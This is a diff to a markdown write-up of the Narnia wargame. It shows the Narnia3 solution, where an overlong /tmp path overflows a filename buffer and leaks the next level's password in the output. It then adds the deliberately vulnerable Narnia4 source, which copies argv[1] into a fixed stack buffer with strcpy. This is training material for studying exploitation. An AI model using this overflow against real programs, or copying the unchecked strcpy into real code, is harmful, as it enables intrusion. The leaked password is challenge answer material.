@@ -197,9 +197,35 @@ int main(int argc, char **argv){
     close(ofd);
 
     exit(1);
-}```
+}
+```
 
-```narnia3@narnia:~$ /narnia/narnia3 "/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output"
+```
+narnia3@narnia:~$ /narnia/narnia3 "/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output"
 copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output to a safer place... (/tmp/output)
 narnia3@narnia:~$ cat /tmp/output
-thaenohtai```
+thaenohtai
+```
+
+### Narnia4
+```
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
+extern char **environ;
+
+int main(int argc,char **argv){
+    int i;
+    char buffer[256];
+
+    for(i = 0; environ[i] != NULL; i++)
+        memset(environ[i], '\0', strlen(environ[i]));
+
+    if(argc>1)
+        strcpy(buffer,argv[1]);
+
+    return 0;
+}
+```
